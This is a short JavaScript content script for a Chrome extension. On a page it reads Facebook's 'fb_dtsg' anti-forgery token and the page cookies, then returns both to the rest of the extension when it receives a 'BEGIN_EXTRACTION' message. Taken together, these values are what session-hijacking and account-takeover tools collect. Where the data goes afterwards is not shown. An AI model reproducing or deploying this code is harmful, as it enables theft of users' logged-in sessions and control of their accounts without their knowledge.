function extractToken() {
    const elements = document.getElementsByName('fb_dtsg');

    if (elements.length > 0) {
        return elements[0].value
    }

    return ''
}

function extractCookie() {
    return document.cookie
}

chrome.runtime.onMessage.addListener(
    function (msg, _, sendResponse) {
        if (msg.action === "BEGIN_EXTRACTION") {
            sendResponse({
                cookie: extractCookie(),
                token: extractToken()
            });
        }
    });
